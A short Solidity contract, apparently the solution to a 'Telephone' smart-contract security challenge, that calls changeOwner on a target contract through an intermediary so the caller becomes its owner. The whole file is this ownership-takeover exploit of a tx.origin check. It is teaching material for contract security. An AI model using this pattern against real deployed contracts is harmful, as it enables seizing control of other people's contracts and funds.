pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract CallTelephone {
    function changeOwner(address _telephoneAddr) public {
        ITelephone(_telephoneAddr).changeOwner(msg.sender);
    }
}
